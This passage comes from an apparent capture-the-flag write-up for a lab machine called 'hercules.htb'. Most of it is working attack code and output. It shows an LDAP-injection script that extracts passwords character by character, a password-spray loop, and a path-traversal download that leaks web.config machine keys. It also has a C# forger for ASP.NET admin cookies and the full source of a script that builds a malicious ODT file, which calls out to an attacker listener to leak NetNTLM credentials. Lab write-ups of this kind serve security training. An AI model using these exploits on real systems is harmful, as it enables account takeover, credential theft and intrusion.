        "jennifer.a", "jessica.e", "joel.c", "johanna.f", "johnathan.j",
        "ken.w", "mark.s", "mikayla.a", "natalie.a", "nate.h",
        "patrick.s", "ramona.l", "ray.n", "rene.s", "shae.j",
        "stephanie.w", "stephen.m", "tanya.r", "taylor.m", "tish.c",
        "vincent.g", "will.s", "winda.s", "zeke.s"
    ]


def save_result(username, password, output_file):
    """Save extracted username:password to output file"""
    with open(output_file, "a") as f:
        f.write(f"{username}:{password}\n")


def run_extraction(user_list, config):
    """
    Main extraction routine - tests all users and extracts passwords
    
    Args:
        user_list: List of usernames to test
        config: Application configuration
        
    Returns:
        Dictionary of username:password pairs found
    """
    print("=" * 70)
    print(f"Target: {config.TARGET_HOST}")
    print(f"Users to test: {len(user_list)}")
    print("=" * 70)

    # Initialize HTTP client and password enumerator
    http_client = HTTPClient(config)
    enumerator = PasswordEnumerator(http_client, config)

    results = {}  # Store successful extractions

    # Try to extract password for each user
    for username in user_list:
        password = enumerator.extract_password(username)
        if password:
            # Success! Save the result
            results[username] = password
            save_result(username, password, config.OUTPUT_FILE)
            print(f"\n>>> SUCCESS: {username}:{password}\n")

    # Print final summary
    print("\n" + "X" * 70)
    print("EXTRACTION COMPLETE")
    print("X" * 70)

    if results:
        print(f"\nExtracted {len(results)} passwords:")
        for user, pwd in results.items():
            print(f"  {user}: {pwd}")
        print(f"\nResults saved to: {config.OUTPUT_FILE}")
    else:
        print("\nNo passwords extracted")

    return results


def main():
    """Main function - sets up and runs the password extraction"""
    config = Config()

    # Load usernames from file if provided, otherwise use default list
    user_file = sys.argv[1] if len(sys.argv) > 1 else None
    users = load_user_list(user_file)

    # Define priority users to test first (most important targets) from random guess here and there recon
    priority = ["johnathan.j", "auditor", "Administrator", "natalie.a", "ken.w"]
    # Regular users (all others)
    regular = [u for u in users if u not in priority]
    # Combine with priority users first
    ordered_users = priority + regular

    # Run the main extraction process
    run_extraction(ordered_users, config)


if __name__ == "__main__":
    main()
```

In above for example:

```bash
# For username "john" with prefix "abc"
injection = "john*)(description=abc*"
```

This transforms the LDAP query to:

```bash
(&(username=john*)(description=abc*)(password=invalid))
```

The injection is URL encoded So in login we send this payload as username: (password can be anything):

```bash
j%6F%68%6E%2A%29%28%64%65%73%63%72%69%70%74%69%6F%6E%3D%61%62%63%2A
```

- **TRUE Condition:** Injection works → "Login attempt failed" message
- **FALSE Condition:** Injection fails → different response
#### Step 1: Check if user has description

**Payload:** `mark.s*)(description=*`  (URL encoded done by above script)
**Query becomes:** `(&(username=mark.s*)(description=*)(password=invalid))`  
**Logic:** If ANY description exists → returns TRUE → "Login attempt failed" message appears
#### Step 2: Extract password character by character

- **Payload:** `mark.s*)(description=a*`
- **If TRUE** → description starts with 'a'
- **If FALSE** → try next character 'b'

**Iteration 2:** Found first char 'P', test second char

- **Payload:** `mark.s*)(description=Pa*`
- **Payload:** `mark.s*)(description=Pb*`
- **Payload:** `mark.s*)(description=Pc*`
- Continue until match...

Of course we need to URL encode our payload:

We can even test with user like `johnathan.j` with this payload `johnathan.j*)(description=*` which URL encoded is `%6A%6F%68%6E%61%74%68%61%6E%2E%6A%2A%29%28%64%65%73%63%72%69%70%74%69%6F%6E%3D%2A` so if we try this payload as username we get:

![[hercules4.png]]

It shows `Login attempt failed`. User `johnathan.j` (or similar) EXISTS in LDAP. So try like this `johnathan.j*)(description=a*` like this this above script goes on and we get the flag. If it didn't exist we would get `Invalid login attempt`.

```bash
$ python3 main.py
======================================================================
Target: https://hercules.htb
Users to test: 40
======================================================================

[*] Target: johnathan.j
[+] Description field exists, extracting password...
    [0] 'c' -> c
    [1] 'h' -> ch
    [2] 'a' -> cha
    [3] 'n' -> chan
    [4] 'g' -> chang
    [5] 'e' -> change
    [6] '*' -> change*
    [7] 't' -> change*t
    [8] 'h' -> change*th
    [9] '1' -> change*th1
    [10] 's' -> change*th1s
    [11] '_' -> change*th1s_
    [12] 'p' -> change*th1s_p
    [13] '@' -> change*th1s_p@
    [14] 's' -> change*th1s_p@s
    [15] 's' -> change*th1s_p@ss
    [16] 'w' -> change*th1s_p@ssw
    [17] '(' -> change*th1s_p@ssw(
    [18] ')' -> change*th1s_p@ssw()
    [19] 'r' -> change*th1s_p@ssw()r
    [20] 'd' -> change*th1s_p@ssw()rd
    [21] '!' -> change*th1s_p@ssw()rd!
    [22] '!' -> change*th1s_p@ssw()rd!!
[+] EXTRACTED: johnathan.j => change*th1s_p@ssw()rd!!

>>> SUCCESS: johnathan.j:change*th1s_p@ssw()rd!!


[*] Target: auditor
[-] No description field found for auditor

[*] Target: Administrator
[-] No description field found for Administrator

[*] Target: natalie.a
[-] No description field found for natalie.a

[*] Target: ken.w
[-] No description field found for ken.w

[*] Target: adriana.i
[-] No description field found for adriana.i

[*] Target: angelo.o
[-] No description field found for angelo.o

[*] Target: anthony.r
[-] No description field found for anthony.r

[*] Target: ashley.b
[-] No description field found for ashley.b

[*] Target: bob.w
[-] No description field found for bob.w

[*] Target: camilla.b
[-] No description field found for camilla.b

[*] Target: clarissa.c
[-] No description field found for clarissa.c

[*] Target: elijah.m
[-] No description field found for elijah.m

[*] Target: fernando.r
[-] No description field found for fernando.r

[*] Target: fiona.c
[-] No description field found for fiona.c

[*] Target: harris.d
[-] No description field found for harris.d

[*] Target: heather.s
[-] No description field found for heather.s

[*] Target: jacob.b
[-] No description field found for jacob.b

[*] Target: james.s
[-] No description field found for james.s

[*] Target: jennifer.a
[-] No description field found for jennifer.a

[*] Target: jessica.e
[-] No description field found for jessica.e

[*] Target: joel.c
[-] No description field found for joel.c

[*] Target: johanna.f
[-] No description field found for johanna.f

[*] Target: mark.s
[-] No description field found for mark.s

[*] Target: mikayla.a
[-] No description field found for mikayla.a

[*] Target: nate.h
[-] No description field found for nate.h

[*] Target: patrick.s
[-] No description field found for patrick.s

[*] Target: ramona.l
[-] No description field found for ramona.l

[*] Target: ray.n
[-] No description field found for ray.n

[*] Target: rene.s
[-] No description field found for rene.s

[*] Target: shae.j
[-] No description field found for shae.j

[*] Target: stephanie.w
[-] No description field found for stephanie.w

[*] Target: stephen.m
[-] No description field found for stephen.m

[*] Target: tanya.r
[-] No description field found for tanya.r

[*] Target: taylor.m
[-] No description field found for taylor.m

[*] Target: tish.c
[-] No description field found for tish.c

[*] Target: vincent.g
[-] No description field found for vincent.g

[*] Target: will.s
[-] No description field found for will.s

[*] Target: winda.s
[-] No description field found for winda.s

[*] Target: zeke.s
[-] No description field found for zeke.s

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
EXTRACTION COMPLETE
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Extracted 1 passwords:
  johnathan.j: change*th1s_p@ssw()rd!!

Results saved to: extracted_passwords.txt
```

Login to site with above creds `johnathan.j:change*th1s_p@ssw()rd!!`. But if we try to login in site we wont be able to fucking login because these are creds for LDAP not site but hey maybe we can password spray this password to other users.
## Password Spray

```python
#!/usr/bin/env python3
import requests
import re
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

users = [
    "adriana.i", "angelo.o", "anthony.r", "ashley.b", "auditor",
    "bob.w", "camilla.b", "clarissa.c", "elijah.m", "fernando.r",
    "fiona.c", "harris.d", "heather.s", "jacob.b", "james.s",
    "jennifer.a", "jessica.e", "joel.c", "johanna.f", "Administrator",
    "ken.w", "mark.s", "mikayla.a", "natalie.a", "nate.h",
    "patrick.s", "ramona.l", "ray.n", "rene.s", "shae.j",
    "stephanie.w", "stephen.m", "tanya.r", "taylor.m", "tish.c",
    "vincent.g", "will.s", "winda.s", "zeke.s"
]

password = 'change*th1s_p@ssw()rd!!'

for user in users:
    session = requests.Session()
    
    # Get CSRF token
    login_page = session.get('https://hercules.htb/login', verify=False)
    token_match = re.search(r'name="__RequestVerificationToken".*?value="([^"]+)"', login_page.text)
    
    if token_match:
        csrf_token = token_match.group(1)
        
        data = {
            '__RequestVerificationToken': csrf_token,
            'Username': user,
            'Password': password,
            'RememberMe': 'false'
        }
        
        response = session.post('https://hercules.htb/Login', data=data, verify=False)
        
        # Check for successful login (no "Invalid login" or "Login attempt failed")
        if 'Invalid login attempt' not in response.text and 'Login attempt failed' not in response.text:
            print(f"[+] SUCCESS: {user}:{password}")
            print(f"    Response different - might be logged in!")
            
            # Save the successful response to check what we got access to
            with open(f"success_{user}.html", "w") as f:
                f.write(response.text)
            print(f"    Response saved to: success_{user}.html")
        else:
            print(f"[-] Failed: {user}")
    else:
        print(f"[!] Could not get CSRF token for {user}")

print("[*] Password spray complete")
```

```bash
$ python3 main.py
[-] Failed: adriana.i
[-] Failed: angelo.o
[-] Failed: anthony.r
[-] Failed: ashley.b
[-] Failed: auditor
[-] Failed: bob.w
[-] Failed: camilla.b
[-] Failed: clarissa.c
[-] Failed: elijah.m
[-] Failed: fernando.r
[-] Failed: fiona.c
[-] Failed: harris.d
[-] Failed: heather.s
[-] Failed: jacob.b
[-] Failed: james.s
[-] Failed: jennifer.a
[-] Failed: jessica.e
[-] Failed: joel.c
[-] Failed: johanna.f
[-] Failed: Administrator
[+] SUCCESS: ken.w:change*th1s_p@ssw()rd!!
    Response different - might be logged in!
    Response saved to: success_ken.w.html
```

Login as `ken.w:change*th1s_p@ssw()rd!!`.

![[hercules5.png]]

Mail has interesting stuffs. We get two domains:

```
10.129.161.47 hercules.htb dc.hercules.htb hadess.htb hade5.htb
```

But both seem to point to this same application.

![[hercules6.png]]

When we try to upload something malicious it says we don't have permission to upload.

![[hercules7.png]]
## LFI (Local File Inclusion)

From download we get `https://hercules.htb/Home/Download?fileName=registration.pdf` Since this is a `.NET` web app we can try viewing `web.config` internally.

We can download from this `https://hercules.htb/Home/Download?fileName=../../web.config`.

```bash
$ cat _.._web.config 
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
```

We got the `web.config` with the **machineKey**! Now we can decrypt and forge cookies.

```xml
<machineKey 
  decryption="AES" 
  decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" 
  validation="HMACSHA256" 
  validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" 
/>
```
## Forging Cookies

Easiest to do on `C#` and python was giving size issues:

```bash
dotnet new console -n AuthCookieGenerator
cd AuthCookieGenerator
# Add the package
dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5
```

Copy the C# code below into `Program.cs`

```cs
using System;
using AspNetCore.LegacyAuthCookieCompat;

class Program
{
    static void Main(string[] args)
    {
        string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";
        string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var encryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, ShaVersion.Sha256);

        Console.WriteLine("ASP.NET Forms Auth Cookie Generator");
        Console.WriteLine("======================================\n");

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(2);

        var ticket = new FormsAuthenticationTicket(
            version: 1,
            name: "web_admin",
            issueDate: issueDate,
            expiration: expiryDate,
            isPersistent: false,
            userData: "Web Administrators",
            cookiePath: "/"
        );

        string encryptedCookie = encryptor.Encrypt(ticket);

        Console.WriteLine("Generated Admin Cookie:");
        Console.WriteLine("==========================");
        Console.WriteLine($"Cookie: {encryptedCookie}");
        Console.WriteLine($"Username: {ticket.Name}");
        Console.WriteLine($"Role: {ticket.UserData}");
        Console.WriteLine($"Expires: {ticket.Expiration}");
        Console.WriteLine("==========================\n");
    } // Missing closing brace for Main method
} // Missing closing brace for Program class
```

```bash
dotnet build
dotnet run
```

```bash
$ dotnet run
ASP.NET Forms Auth Cookie Generator
======================================

Generated Admin Cookie:
==========================
Cookie: 291EF590949F90E8941C1D2471F935ED451E399E57348BF9F61FAE32A27700560ADDF5D306967BEE6D8E2DB17285E2BD8FF3ACE92835853F91642D07382A331E8B90A0B754B78B2DAEFA2C222E9BA830637412F484864034A3C26FDF766CDECC9555CE37310C00B4495E9B17E96EBB0CDFB9A6C0CD15FDF89EE24B6DDDD2A4A48AED357D6C02DB4593C20338DFA2E110B9D2760C98E60F6D69C6EA15461A1CD1121B6953ED95802987FAE05F44D6DD6ACE5CD5854049A0B829DFD210CA785966
Username: web_admin
Role: Web Administrators
Expires: 10/19/2025 7:47:10PM
==========================
```

Now use that cookie and refresh the page.

![[hercules8.png]]

Now that we are `web_admin` we can upload the form and submit it.
## Responder
### BadODT

Create a malicious ODT ( OpenDocument Text) file and [upload](https://github.com/rmdavy/badodf) and start a responder.

```bash
$ git clone https://github.com/rmdavy/badodf
Cloning into 'badodf'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 15 (delta 0), reused 2 (delta 0), pack-reused 11 (from 1)
Receiving objects: 100% (15/15), 9.00 KiB | 9.00 MiB/s, done.
Resolving deltas: 100% (3/3), done.
```

```bash
$ cat badodt.py 
#! /usr/bin/python3
#Quick script/POC code to create a malicious ODF which can be used to leak NetNTLM credentials 
#Usage - Setup responder or similar create a malicious file and point to listener.
#Works against LibreOffice 6.03 and OpenOffice 4.1.5

import ezodf
import os
import zipfile
import base64

print("""
    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     

""")
print("Create a malicious ODF document help leak NetNTLM Creds")
print("\nBy Richard Davy ")
print("@rd_pentest")
print("Python3 version by @gustanini")
print("www.secureyourit.co.uk\n")

# Create a blank ODT file
namef = "temp.odt"
odt = ezodf.newdoc(doctype='odt', filename=namef)
odt.save()

#Create our modified content.xml file
contentxml1="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"
contentxml2=input("\nPlease enter IP of listener: ")
contentxml3="L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="

fileout = base64.b64decode(contentxml1).decode() + contentxml2 + base64.b64decode(contentxml3).decode()

with open("content.xml", "w") as text_file:
    text_file.write(fileout)

